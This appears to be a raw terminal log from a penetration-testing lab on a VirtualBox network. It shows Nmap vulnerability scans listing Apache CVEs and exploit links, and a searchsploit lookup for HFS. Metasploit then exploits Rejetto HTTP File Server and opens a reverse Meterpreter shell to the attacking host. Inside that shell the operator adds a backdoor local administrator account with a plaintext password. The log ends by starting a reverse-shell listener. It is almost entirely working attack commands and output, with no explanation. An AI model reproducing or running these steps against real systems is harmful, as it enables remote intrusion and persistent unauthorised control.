+|       CVE-2024-38474  9.8     https://vulners.com/cve/CVE-2024-38474
+|       CVE-2023-25690  9.8     https://vulners.com/cve/CVE-2023-25690
+|       CNVD-2024-36391 9.8     https://vulners.com/cnvd/CNVD-2024-36391
+|       CNVD-2024-36388 9.8     https://vulners.com/cnvd/CNVD-2024-36388
+|       64A540A8-D918-5BEA-8F60-987F97B27A0C    9.8     https://vulners.com/githubexploit/64A540A8-D918-5BEA-8F60-987F97B27A0C  *EXPLOIT*
+|       5C1BB960-90C1-5EBF-9BEF-F58BFFDFEED9    9.8     https://vulners.com/githubexploit/5C1BB960-90C1-5EBF-9BEF-F58BFFDFEED9  *EXPLOIT*
+|       3F17CA20-788F-5C45-88B3-E12DB2979B7B    9.8     https://vulners.com/githubexploit/3F17CA20-788F-5C45-88B3-E12DB2979B7B  *EXPLOIT*
+|       1337DAY-ID-39214        9.8     https://vulners.com/zdt/1337DAY-ID-39214        *EXPLOIT*
+|       PACKETSTORM:213257      9.1     https://vulners.com/packetstorm/PACKETSTORM:213257      *EXPLOIT*
+|       FD2EE3A5-BAEA-5845-BA35-E6889992214F    9.1     https://vulners.com/githubexploit/FD2EE3A5-BAEA-5845-BA35-E6889992214F  *EXPLOIT*
+|       FBC8A8BE-F00A-5B6D-832E-F99A72E7A3F7    9.1     https://vulners.com/githubexploit/FBC8A8BE-F00A-5B6D-832E-F99A72E7A3F7  *EXPLOIT*
+|       E606D7F4-5FA2-5907-B30E-367D6FFECD89    9.1     https://vulners.com/githubexploit/E606D7F4-5FA2-5907-B30E-367D6FFECD89  *EXPLOIT*
+|       D8A19443-2A37-5592-8955-F614504AAF45    9.1     https://vulners.com/githubexploit/D8A19443-2A37-5592-8955-F614504AAF45  *EXPLOIT*
+|       CVE-2025-23048  9.1     https://vulners.com/cve/CVE-2025-23048
+|       CVE-2024-40898  9.1     https://vulners.com/cve/CVE-2024-40898
+|       CVE-2024-38475  9.1     https://vulners.com/cve/CVE-2024-38475
+|       CNVD-2025-16610 9.1     https://vulners.com/cnvd/CNVD-2025-16610
+|       CNVD-2024-36387 9.1     https://vulners.com/cnvd/CNVD-2024-36387
+|       CNVD-2024-33814 9.1     https://vulners.com/cnvd/CNVD-2024-33814
+|       B5E74010-A082-5ECE-AB37-623A5B33FE7D    9.1     https://vulners.com/githubexploit/B5E74010-A082-5ECE-AB37-623A5B33FE7D  *EXPLOIT*
+|       5418A85B-F4B7-5BBD-B106-0800AC961C7A    9.1     https://vulners.com/githubexploit/5418A85B-F4B7-5BBD-B106-0800AC961C7A  *EXPLOIT*
+|       CVE-2022-36760  9.0     https://vulners.com/cve/CVE-2022-36760
+|       CNVD-2023-30860 9.0     https://vulners.com/cnvd/CNVD-2023-30860
+|       3F71F065-66D4-541F-A813-9F1A2F2B1D91    8.8     https://vulners.com/githubexploit/3F71F065-66D4-541F-A813-9F1A2F2B1D91  *EXPLOIT*
+|       CVE-2025-58098  8.3     https://vulners.com/cve/CVE-2025-58098
+|       B0A9E5E8-7CCC-5984-9922-A89F11D6BF38    8.2     https://vulners.com/githubexploit/B0A9E5E8-7CCC-5984-9922-A89F11D6BF38  *EXPLOIT*
+|       CVE-2024-38473  8.1     https://vulners.com/cve/CVE-2024-38473
+|       249A954E-0189-5182-AE95-31C866A057E1    8.1     https://vulners.com/githubexploit/249A954E-0189-5182-AE95-31C866A057E1  *EXPLOIT*
+|       23079A70-8B37-56D2-9D37-F638EBF7F8B5    8.1     https://vulners.com/githubexploit/23079A70-8B37-56D2-9D37-F638EBF7F8B5  *EXPLOIT*
+|       DF041B2B-2DA7-5262-AABE-9EBD2D535041    7.8     https://vulners.com/githubexploit/DF041B2B-2DA7-5262-AABE-9EBD2D535041  *EXPLOIT*
+|       PACKETSTORM:212872      7.5     https://vulners.com/packetstorm/PACKETSTORM:212872      *EXPLOIT*
+|       PACKETSTORM:211124      7.5     https://vulners.com/packetstorm/PACKETSTORM:211124      *EXPLOIT*
+|       EDB-ID:52426    7.5     https://vulners.com/exploitdb/EDB-ID:52426      *EXPLOIT*
+|       E5C174E5-D6E8-56E0-8403-D287DE52EB3F    7.5     https://vulners.com/githubexploit/E5C174E5-D6E8-56E0-8403-D287DE52EB3F  *EXPLOIT*
+|       DB6E1BBD-08B1-574D-A351-7D6BB9898A4A    7.5     https://vulners.com/githubexploit/DB6E1BBD-08B1-574D-A351-7D6BB9898A4A  *EXPLOIT*
+|       D228B59B-465A-509D-A681-012DB9348698    7.5     https://vulners.com/githubexploit/D228B59B-465A-509D-A681-012DB9348698  *EXPLOIT*
+|       CVE-2025-59775  7.5     https://vulners.com/cve/CVE-2025-59775
+|       CVE-2025-55753  7.5     https://vulners.com/cve/CVE-2025-55753
+|       CVE-2025-53020  7.5     https://vulners.com/cve/CVE-2025-53020
+|       CVE-2025-49630  7.5     https://vulners.com/cve/CVE-2025-49630
+|       CVE-2024-47252  7.5     https://vulners.com/cve/CVE-2024-47252
+|       CVE-2024-43394  7.5     https://vulners.com/cve/CVE-2024-43394
+|       CVE-2024-43204  7.5     https://vulners.com/cve/CVE-2024-43204
+|       CVE-2024-42516  7.5     https://vulners.com/cve/CVE-2024-42516
+|       CVE-2024-39573  7.5     https://vulners.com/cve/CVE-2024-39573
+|       CVE-2024-38477  7.5     https://vulners.com/cve/CVE-2024-38477
+|       CVE-2024-38472  7.5     https://vulners.com/cve/CVE-2024-38472
+|       CVE-2024-27316  7.5     https://vulners.com/cve/CVE-2024-27316
+|       CVE-2023-31122  7.5     https://vulners.com/cve/CVE-2023-31122
+|       CVE-2023-27522  7.5     https://vulners.com/cve/CVE-2023-27522
+|       CVE-2006-20001  7.5     https://vulners.com/cve/CVE-2006-20001
+|       CNVD-2025-30837 7.5     https://vulners.com/cnvd/CNVD-2025-30837
+|       CNVD-2025-30836 7.5     https://vulners.com/cnvd/CNVD-2025-30836
+|       CNVD-2025-16614 7.5     https://vulners.com/cnvd/CNVD-2025-16614
+|       CNVD-2025-16613 7.5     https://vulners.com/cnvd/CNVD-2025-16613
+|       CNVD-2025-16612 7.5     https://vulners.com/cnvd/CNVD-2025-16612
+|       CNVD-2025-16609 7.5     https://vulners.com/cnvd/CNVD-2025-16609
+|       CNVD-2025-16608 7.5     https://vulners.com/cnvd/CNVD-2025-16608
+|       CNVD-2025-16603 7.5     https://vulners.com/cnvd/CNVD-2025-16603
+|       CNVD-2024-36393 7.5     https://vulners.com/cnvd/CNVD-2024-36393
+|       CNVD-2024-36390 7.5     https://vulners.com/cnvd/CNVD-2024-36390
+|       CNVD-2024-36389 7.5     https://vulners.com/cnvd/CNVD-2024-36389
+|       CNVD-2024-20839 7.5     https://vulners.com/cnvd/CNVD-2024-20839
+|       CNVD-2023-93320 7.5     https://vulners.com/cnvd/CNVD-2023-93320
+|       CNVD-2023-80558 7.5     https://vulners.com/cnvd/CNVD-2023-80558
+|       CDC791CD-A414-5ABE-A897-7CFA3C2D3D29    7.5     https://vulners.com/githubexploit/CDC791CD-A414-5ABE-A897-7CFA3C2D3D29  *EXPLOIT*
+|       BD3652A9-D066-57BA-9943-4E34970463B9    7.5     https://vulners.com/githubexploit/BD3652A9-D066-57BA-9943-4E34970463B9  *EXPLOIT*
+|       B0208442-6E17-5772-B12D-B5BE30FA5540    7.5     https://vulners.com/githubexploit/B0208442-6E17-5772-B12D-B5BE30FA5540  *EXPLOIT*
+|       A6687F08-B033-5AE7-84F5-DE799491DA2F    7.5     https://vulners.com/githubexploit/A6687F08-B033-5AE7-84F5-DE799491DA2F  *EXPLOIT*
+|       A66531EB-3C47-5C56-B8A6-E04B54E9D656    7.5     https://vulners.com/githubexploit/A66531EB-3C47-5C56-B8A6-E04B54E9D656  *EXPLOIT*
+|       9814661A-35A4-5DB7-BB25-A1040F365C81    7.5     https://vulners.com/githubexploit/9814661A-35A4-5DB7-BB25-A1040F365C81  *EXPLOIT*
+|       8132DEBA-6222-5A32-84DE-B97EF48D0F99    7.5     https://vulners.com/githubexploit/8132DEBA-6222-5A32-84DE-B97EF48D0F99  *EXPLOIT*
+|       45D138AD-BEC6-552A-91EA-8816914CA7F4    7.5     https://vulners.com/githubexploit/45D138AD-BEC6-552A-91EA-8816914CA7F4  *EXPLOIT*
+|       40879618-C556-547C-8769-9E63E83D0B55    7.5     https://vulners.com/githubexploit/40879618-C556-547C-8769-9E63E83D0B55  *EXPLOIT*
+|       1F6E0709-DA03-564E-925F-3177657C053E    7.5     https://vulners.com/githubexploit/1F6E0709-DA03-564E-925F-3177657C053E  *EXPLOIT*
+|       135C45BD-4652-5EEE-8890-2D3C62709016    7.5     https://vulners.com/githubexploit/135C45BD-4652-5EEE-8890-2D3C62709016  *EXPLOIT*
+|       CVE-2025-49812  7.4     https://vulners.com/cve/CVE-2025-49812
+|       CVE-2023-38709  7.3     https://vulners.com/cve/CVE-2023-38709
+|       CNVD-2024-36395 7.3     https://vulners.com/cnvd/CNVD-2024-36395
+|       CVE-2025-65082  6.5     https://vulners.com/cve/CVE-2025-65082
+|       CNVD-2025-30833 6.5     https://vulners.com/cnvd/CNVD-2025-30833
+|       CVE-2024-24795  6.3     https://vulners.com/cve/CVE-2024-24795
+|       CNVD-2024-36394 6.3     https://vulners.com/cnvd/CNVD-2024-36394
+|       CVE-2023-45802  5.9     https://vulners.com/cve/CVE-2023-45802
+|       CVE-2025-66200  5.4     https://vulners.com/cve/CVE-2025-66200
+|       CNVD-2025-30835 5.4     https://vulners.com/cnvd/CNVD-2025-30835
+|       CVE-2022-37436  5.3     https://vulners.com/cve/CVE-2022-37436
+|_      CNVD-2023-30859 5.3     https://vulners.com/cnvd/CNVD-2023-30859
+445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+3306/tcp open  mysql        MariaDB 10.3.23 or earlier (unauthorized)
+5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+7000/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-IIS/10.0
+8000/tcp open  http         Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/7.4.30)
+|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/7.4.30
+| vulners: 
+|   cpe:/a:apache:http_server:2.4.54: 
+|       PACKETSTORM:176334      9.8     https://vulners.com/packetstorm/PACKETSTORM:176334      *EXPLOIT*
+|       CVE-2024-38476  9.8     https://vulners.com/cve/CVE-2024-38476
+|       CVE-2024-38474  9.8     https://vulners.com/cve/CVE-2024-38474
+|       CVE-2023-25690  9.8     https://vulners.com/cve/CVE-2023-25690
+|       CNVD-2024-36391 9.8     https://vulners.com/cnvd/CNVD-2024-36391
+|       CNVD-2024-36388 9.8     https://vulners.com/cnvd/CNVD-2024-36388
+|       64A540A8-D918-5BEA-8F60-987F97B27A0C    9.8     https://vulners.com/githubexploit/64A540A8-D918-5BEA-8F60-987F97B27A0C  *EXPLOIT*
+|       5C1BB960-90C1-5EBF-9BEF-F58BFFDFEED9    9.8     https://vulners.com/githubexploit/5C1BB960-90C1-5EBF-9BEF-F58BFFDFEED9  *EXPLOIT*
+|       3F17CA20-788F-5C45-88B3-E12DB2979B7B    9.8     https://vulners.com/githubexploit/3F17CA20-788F-5C45-88B3-E12DB2979B7B  *EXPLOIT*
+|       1337DAY-ID-39214        9.8     https://vulners.com/zdt/1337DAY-ID-39214        *EXPLOIT*
+|       PACKETSTORM:213257      9.1     https://vulners.com/packetstorm/PACKETSTORM:213257      *EXPLOIT*
+|       FD2EE3A5-BAEA-5845-BA35-E6889992214F    9.1     https://vulners.com/githubexploit/FD2EE3A5-BAEA-5845-BA35-E6889992214F  *EXPLOIT*
+|       FBC8A8BE-F00A-5B6D-832E-F99A72E7A3F7    9.1     https://vulners.com/githubexploit/FBC8A8BE-F00A-5B6D-832E-F99A72E7A3F7  *EXPLOIT*
+|       E606D7F4-5FA2-5907-B30E-367D6FFECD89    9.1     https://vulners.com/githubexploit/E606D7F4-5FA2-5907-B30E-367D6FFECD89  *EXPLOIT*
+|       D8A19443-2A37-5592-8955-F614504AAF45    9.1     https://vulners.com/githubexploit/D8A19443-2A37-5592-8955-F614504AAF45  *EXPLOIT*
+|       CVE-2025-23048  9.1     https://vulners.com/cve/CVE-2025-23048
+|       CVE-2024-40898  9.1     https://vulners.com/cve/CVE-2024-40898
+|       CVE-2024-38475  9.1     https://vulners.com/cve/CVE-2024-38475
+|       CNVD-2025-16610 9.1     https://vulners.com/cnvd/CNVD-2025-16610
+|       CNVD-2024-36387 9.1     https://vulners.com/cnvd/CNVD-2024-36387
+|       CNVD-2024-33814 9.1     https://vulners.com/cnvd/CNVD-2024-33814
+|       B5E74010-A082-5ECE-AB37-623A5B33FE7D    9.1     https://vulners.com/githubexploit/B5E74010-A082-5ECE-AB37-623A5B33FE7D  *EXPLOIT*
+|       5418A85B-F4B7-5BBD-B106-0800AC961C7A    9.1     https://vulners.com/githubexploit/5418A85B-F4B7-5BBD-B106-0800AC961C7A  *EXPLOIT*
+|       CVE-2022-36760  9.0     https://vulners.com/cve/CVE-2022-36760
+|       CNVD-2023-30860 9.0     https://vulners.com/cnvd/CNVD-2023-30860
+|       3F71F065-66D4-541F-A813-9F1A2F2B1D91    8.8     https://vulners.com/githubexploit/3F71F065-66D4-541F-A813-9F1A2F2B1D91  *EXPLOIT*
+|       CVE-2025-58098  8.3     https://vulners.com/cve/CVE-2025-58098
+|       B0A9E5E8-7CCC-5984-9922-A89F11D6BF38    8.2     https://vulners.com/githubexploit/B0A9E5E8-7CCC-5984-9922-A89F11D6BF38  *EXPLOIT*
+|       CVE-2024-38473  8.1     https://vulners.com/cve/CVE-2024-38473
+|       249A954E-0189-5182-AE95-31C866A057E1    8.1     https://vulners.com/githubexploit/249A954E-0189-5182-AE95-31C866A057E1  *EXPLOIT*
+|       23079A70-8B37-56D2-9D37-F638EBF7F8B5    8.1     https://vulners.com/githubexploit/23079A70-8B37-56D2-9D37-F638EBF7F8B5  *EXPLOIT*
+|       DF041B2B-2DA7-5262-AABE-9EBD2D535041    7.8     https://vulners.com/githubexploit/DF041B2B-2DA7-5262-AABE-9EBD2D535041  *EXPLOIT*
+|       PACKETSTORM:212872      7.5     https://vulners.com/packetstorm/PACKETSTORM:212872      *EXPLOIT*
+|       PACKETSTORM:211124      7.5     https://vulners.com/packetstorm/PACKETSTORM:211124      *EXPLOIT*
+|       EDB-ID:52426    7.5     https://vulners.com/exploitdb/EDB-ID:52426      *EXPLOIT*
+|       E5C174E5-D6E8-56E0-8403-D287DE52EB3F    7.5     https://vulners.com/githubexploit/E5C174E5-D6E8-56E0-8403-D287DE52EB3F  *EXPLOIT*
+|       DB6E1BBD-08B1-574D-A351-7D6BB9898A4A    7.5     https://vulners.com/githubexploit/DB6E1BBD-08B1-574D-A351-7D6BB9898A4A  *EXPLOIT*
+|       D228B59B-465A-509D-A681-012DB9348698    7.5     https://vulners.com/githubexploit/D228B59B-465A-509D-A681-012DB9348698  *EXPLOIT*
+|       CVE-2025-59775  7.5     https://vulners.com/cve/CVE-2025-59775
+|       CVE-2025-55753  7.5     https://vulners.com/cve/CVE-2025-55753
+|       CVE-2025-53020  7.5     https://vulners.com/cve/CVE-2025-53020
+|       CVE-2025-49630  7.5     https://vulners.com/cve/CVE-2025-49630
+|       CVE-2024-47252  7.5     https://vulners.com/cve/CVE-2024-47252
+|       CVE-2024-43394  7.5     https://vulners.com/cve/CVE-2024-43394
+|       CVE-2024-43204  7.5     https://vulners.com/cve/CVE-2024-43204
+|       CVE-2024-42516  7.5     https://vulners.com/cve/CVE-2024-42516
+|       CVE-2024-39573  7.5     https://vulners.com/cve/CVE-2024-39573
+|       CVE-2024-38477  7.5     https://vulners.com/cve/CVE-2024-38477
+|       CVE-2024-38472  7.5     https://vulners.com/cve/CVE-2024-38472
+|       CVE-2024-27316  7.5     https://vulners.com/cve/CVE-2024-27316
+|       CVE-2023-31122  7.5     https://vulners.com/cve/CVE-2023-31122
+|       CVE-2023-27522  7.5     https://vulners.com/cve/CVE-2023-27522
+|       CVE-2006-20001  7.5     https://vulners.com/cve/CVE-2006-20001
+|       CNVD-2025-30837 7.5     https://vulners.com/cnvd/CNVD-2025-30837
+|       CNVD-2025-30836 7.5     https://vulners.com/cnvd/CNVD-2025-30836
+|       CNVD-2025-16614 7.5     https://vulners.com/cnvd/CNVD-2025-16614
+|       CNVD-2025-16613 7.5     https://vulners.com/cnvd/CNVD-2025-16613
+|       CNVD-2025-16612 7.5     https://vulners.com/cnvd/CNVD-2025-16612
+|       CNVD-2025-16609 7.5     https://vulners.com/cnvd/CNVD-2025-16609
+|       CNVD-2025-16608 7.5     https://vulners.com/cnvd/CNVD-2025-16608
+|       CNVD-2025-16603 7.5     https://vulners.com/cnvd/CNVD-2025-16603
+|       CNVD-2024-36393 7.5     https://vulners.com/cnvd/CNVD-2024-36393
+|       CNVD-2024-36390 7.5     https://vulners.com/cnvd/CNVD-2024-36390
+|       CNVD-2024-36389 7.5     https://vulners.com/cnvd/CNVD-2024-36389
+|       CNVD-2024-20839 7.5     https://vulners.com/cnvd/CNVD-2024-20839
+|       CNVD-2023-93320 7.5     https://vulners.com/cnvd/CNVD-2023-93320
+|       CNVD-2023-80558 7.5     https://vulners.com/cnvd/CNVD-2023-80558
+|       CDC791CD-A414-5ABE-A897-7CFA3C2D3D29    7.5     https://vulners.com/githubexploit/CDC791CD-A414-5ABE-A897-7CFA3C2D3D29  *EXPLOIT*
+|       BD3652A9-D066-57BA-9943-4E34970463B9    7.5     https://vulners.com/githubexploit/BD3652A9-D066-57BA-9943-4E34970463B9  *EXPLOIT*
+|       B0208442-6E17-5772-B12D-B5BE30FA5540    7.5     https://vulners.com/githubexploit/B0208442-6E17-5772-B12D-B5BE30FA5540  *EXPLOIT*
+|       A6687F08-B033-5AE7-84F5-DE799491DA2F    7.5     https://vulners.com/githubexploit/A6687F08-B033-5AE7-84F5-DE799491DA2F  *EXPLOIT*
+|       A66531EB-3C47-5C56-B8A6-E04B54E9D656    7.5     https://vulners.com/githubexploit/A66531EB-3C47-5C56-B8A6-E04B54E9D656  *EXPLOIT*
+|       9814661A-35A4-5DB7-BB25-A1040F365C81    7.5     https://vulners.com/githubexploit/9814661A-35A4-5DB7-BB25-A1040F365C81  *EXPLOIT*
+|       8132DEBA-6222-5A32-84DE-B97EF48D0F99    7.5     https://vulners.com/githubexploit/8132DEBA-6222-5A32-84DE-B97EF48D0F99  *EXPLOIT*
+|       45D138AD-BEC6-552A-91EA-8816914CA7F4    7.5     https://vulners.com/githubexploit/45D138AD-BEC6-552A-91EA-8816914CA7F4  *EXPLOIT*
+|       40879618-C556-547C-8769-9E63E83D0B55    7.5     https://vulners.com/githubexploit/40879618-C556-547C-8769-9E63E83D0B55  *EXPLOIT*
+|       1F6E0709-DA03-564E-925F-3177657C053E    7.5     https://vulners.com/githubexploit/1F6E0709-DA03-564E-925F-3177657C053E  *EXPLOIT*
+|       135C45BD-4652-5EEE-8890-2D3C62709016    7.5     https://vulners.com/githubexploit/135C45BD-4652-5EEE-8890-2D3C62709016  *EXPLOIT*
+|       CVE-2025-49812  7.4     https://vulners.com/cve/CVE-2025-49812
+|       CVE-2023-38709  7.3     https://vulners.com/cve/CVE-2023-38709
+|       CNVD-2024-36395 7.3     https://vulners.com/cnvd/CNVD-2024-36395
+|       CVE-2025-65082  6.5     https://vulners.com/cve/CVE-2025-65082
+|       CNVD-2025-30833 6.5     https://vulners.com/cnvd/CNVD-2025-30833
+|       CVE-2024-24795  6.3     https://vulners.com/cve/CVE-2024-24795
+|       CNVD-2024-36394 6.3     https://vulners.com/cnvd/CNVD-2024-36394
+|       CVE-2023-45802  5.9     https://vulners.com/cve/CVE-2023-45802
+|       CVE-2025-66200  5.4     https://vulners.com/cve/CVE-2025-66200
+|       CNVD-2025-30835 5.4     https://vulners.com/cnvd/CNVD-2025-30835
+|       CVE-2022-37436  5.3     https://vulners.com/cve/CVE-2022-37436
+|_      CNVD-2023-30859 5.3     https://vulners.com/cnvd/CNVD-2023-30859
+9100/tcp open  jetdirect?
+MAC Address: 08:00:27:DB:3F:7A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Microsoft Windows 2016|2019
+OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2019
+OS details: Microsoft Windows Server 2016 or Server 2019
+Network Distance: 1 hop
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Nmap scan report for 192.168.56.124
+Host is up (0.000032s latency).
+All 1000 scanned ports on 192.168.56.124 are in ignored states.
+Not shown: 1000 closed tcp ports (reset)
+Too many fingerprints match this host to give specific OS details
+Network Distance: 0 hops
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 256 IP addresses (4 hosts up) scanned in 37.43 seconds
+                                                                                                                                                             
+┌──(star㉿kali)-[~]
+└─$ searchsploit HFS 2.3                               
+--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                             |  Path
+--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+HFS (HTTP File Server) 2.3.x - Remote Command Execution (3)                                                                | windows/remote/49584.py
+HFS Http File Server 2.3m Build 300 - Buffer Overflow (PoC)                                                                | multiple/remote/48569.py
+Rejetto HTTP File Server (HFS) - Remote Command Execution (Metasploit)                                                     | windows/remote/34926.rb
+Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload                                                             | multiple/remote/30850.txt
+Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)                                                        | windows/remote/34668.txt
+Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)                                                        | windows/remote/39161.py
+Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution                                                   | windows/webapps/34852.txt
+--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+                                                                                                                                                             
+┌──(star㉿kali)-[~]
+└─$ sudo msfconsole                                    
+Metasploit tip: After running db_nmap, be sure to check out the result 
+of hosts and services
+                                                  
+  +-------------------------------------------------------+
+  |  METASPLOIT by Rapid7                                 |                                                                                                  
+  +---------------------------+---------------------------+                                                                                                  
+  |      __________________   |                           |                                                                                                  
+  |  ==c(______(o(______(_()  | |""""""""""""|======[***  |                                                                                                  
+  |             )=\           | |  EXPLOIT   \            |                                                                                                  
+  |            // \\          | |_____________\_______    |                                                                                                  
+  |           //   \\         | |==[msf >]============\   |                                                                                                  
+  |          //     \\        | |______________________\  |                                                                                                  
+  |         // RECON \\       | \(@)(@)(@)(@)(@)(@)(@)/   |                                                                                                  
+  |        //         \\      |  *********************    |                                                                                                  
+  +---------------------------+---------------------------+                                                                                                  
+  |      o O o                |        \'\/\/\/'/         |                                                                                                  
+  |              o O          |         )======(          |                                                                                                  
+  |                 o         |       .'  LOOT  '.        |                                                                                                  
+  | |^^^^^^^^^^^^^^|l___      |      /    _||__   \       |                                                                                                  
+  | |    PAYLOAD     |""\___, |     /    (_||_     \      |                                                                                                  
+  | |________________|__|)__| |    |     __||_)     |     |                                                                                                  
+  | |(@)(@)"""**|(@)(@)**|(@) |    "       ||       "     |                                                                                                  
+  |  = = = = = = = = = = = =  |     '--------------'      |                                                                                                  
+  +---------------------------+---------------------------+                                                                                                  
+
+
+       =[ metasploit v6.4.84-dev                                ]
++ -- --=[ 2,547 exploits - 1,309 auxiliary - 1,683 payloads     ]
++ -- --=[ 432 post - 49 encoders - 13 nops - 9 evasion          ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+The Metasploit Framework is a Rapid7 Open Source Project
+
+msf > search hfs
+
+Matching Modules
+================
+
+   #  Name                                                 Disclosure Date  Rank       Check  Description
+   -  ----                                                 ---------------  ----       -----  -----------
+   0  exploit/multi/http/git_client_command_exec           2014-12-18       excellent  No     Malicious Git and Mercurial HTTP Server For CVE-2014-9390
+   1    \_ target: Automatic                               .                .          .      .
+   2    \_ target: Windows Powershell                      .                .          .      .
+   3  exploit/windows/http/rejetto_hfs_rce_cve_2024_23692  2024-05-25       excellent  Yes    Rejetto HTTP File Server (HFS) Unauthenticated Remote Code Execution
+   4  exploit/windows/http/rejetto_hfs_exec                2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution
+
+
+Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/http/rejetto_hfs_exec
+
+msf > use 4
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf exploit(windows/http/rejetto_hfs_exec) > set payload 164
+msf exploit(windows/http/rejetto_hfs_exec) > set RHOSTS 192.168.56.117
+RHOSTS => 192.168.56.117
+msf exploit(windows/http/rejetto_hfs_exec) > set LHOST 192.168.56.124
+LHOST => 192.168.56.124
+msf exploit(windows/http/rejetto_hfs_exec) > run
+[*] Started reverse TCP handler on 192.168.56.124:4444 
+[*] Using URL: http://192.168.56.124:8080/bCdjzL5dkBQ8cMH
+[*] Server started.
+[*] Sending a malicious request to /
+[*] Payload request received: /bCdjzL5dkBQ8cMH
+[*] Sending stage (177734 bytes) to 192.168.56.117
+[!] Tried to delete %TEMP%\QISqbwcZswsWnE.vbs, unknown result
+[*] Meterpreter session 1 opened (192.168.56.124:4444 -> 192.168.56.117:49678) at 2025-12-24 00:20:35 +0530
+[*] Server stopped.
+
+meterpreter > shell
+Process 3972 created.
+Channel 2 created.
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Rejetto>clear
+clear
+'clear' is not recognized as an internal or external command,
+operable program or batch file.
+
+C:\Rejetto>net user tinku admin@1234 /add
+net user tinku admin@1234 /add
+The command completed successfully.
+
+
+C:\Rejetto>net localgroup administrators tinku /add
+net localgroup administrators tinku /add
+The command completed successfully.
+
+
+C:\Rejetto>history
+history
+'history' is not recognized as an internal or external command,
+operable program or batch file.
+
+C:\Rejetto>exit
+exit
+meterpreter > history
+[-] Unknown command: history. Run the help command for more details.
+meterpreter > exit
+[*] Shutting down session: 1
+
+[*] 192.168.56.117 - Meterpreter session 1 closed.  Reason: Died
+msf exploit(windows/http/rejetto_hfs_exec) > history
+12   set RHOSTS 192.168.56.115
+13   run
+14   exit
+15   search smb_version
+16   use 0
+17   options
+18   set RHOSTS 192.168.56.115
+19   run
+20   exit
+21   search trans2open
+22   search smb_version
+23   use 0
+24   set RHOSTS 192.168.56.115
+25   run
+26   exit
+27   search transopen
+28   search trans2open
+29   use 1
+30   set payload /linux/x86/shell_reverse_tcp
+31   show payload
+32   exploit
+33   exit
+34   search trans2open
+35   use 1
+36   show payload
+37   show payloads
+38   set payload payload/linux/x86/shell_reverse_tcp
+39   exploit
+40   sessions
+41   sessions -t 3
+42   sessions -i 3
+43   sessions
+44   ls
+45   options
+46   clear
+47   exit
+48   search trans2open
+49   use 1
+50   set payload payload/linux/x86/shell/reverse_tcp
+51   set RHOSTS 192.168.56.115
+52   set LHOST 192.168.56.124
+53   options
+54   run
+55   sessions
+56   session -i 3
+57   sessions -i 3
+58   exit -y
+59   search smbclient_version
+60   search smb_version
+61   use 90
+62   use 0
+63   options
+64   set RHOSTS 192.168.56.115
+65   RUN
+66   run
+67   exi t
+68   exit
+69   search trans2open
+70   use 1
+71   set payload payload/linux/x86/shell/reverse_tcp
+72   set RHOSTS 192.168.56.115
+73   OPTIONS
+74   options
+75   set LHOST 192.168.56.124
+76   options
+77   run
+78   sessions
+79   sessions -i 3
+80   search hfs
+81   use 4
+82   show payload
+83   show payloads
+84   set payload payload/windows/shell/reverse_tcp
+85   options
+86   set RHOSTS 192.168.56.118
+87   set LHOST 192.168.56.124
+88   OPTIONS
+89   options
+90   exploit
+91   run
+92   exit
+93   search hfs
+94   use 4
+95   show payloads
+96   set payload 164
+97   set RHOSTS 192.168.56.118
+98   set LHOST 192.168.56.124
+99   run
+100  set RHOSTS 192.168.56.118
+101  options
+102  set LPORT 4443
+103  exploit
+104  exit
+105  search hfs
+106  use 4
+107  set payload 164
+108  set RHOSTS 192.168.56.117
+109  set LHOST 192.168.56.124
+110  run
+111  history
+msf exploit(windows/http/rejetto_hfs_exec) > exit
+                                                                                                                                                             
+┌──(star㉿kali)-[~]
+└─$ history 
+    1  hostname
+    2  echo $USER
+    3  clear
+    4  pwd
+    5  clear
+    6  apt update
+    7  clear
+    8  sudo -s
+    9  sudo netdiscover
+   10  searchsploit HFS 2.3
+   11  sudo msfconsole
+   12  searchsploit HFS 2.3
+   13  sudo msfconsole
+   14  searchsploit HFS 2.3
+   15  clear
+   16  sudo nmap -sV -O --script=vulner 192.168.56.118/24
+   17  sudo nmap -sV -O --script=vulners 192.168.56.118/24
+   18  sudo netdiscover
+   19  sudo netdiscover -r 192.168.56.0/24
+   20  sudo nmap -sV -O --script=vulners 192.168.56.117/24
+   21  searchsploit HFS 2.3
+   22  sudo msfconsole
+
+
+msf exploit(multi/handler) > set payload payload/windows/shell/reverse_tcp
+payload => windows/shell/reverse_tcp
+msf exploit(multi/handler) > options
+
+Payload options (windows/shell/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST                      yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+
+View the full module info with the info, or info -d command.
+
+msf exploit(multi/handler) > set LHOST 192.168.56.124
+LHOST => 192.168.56.124
+msf exploit(multi/handler) > set LPORT 4444
+LPORT => 4444
+msf exploit(multi/handler) > run
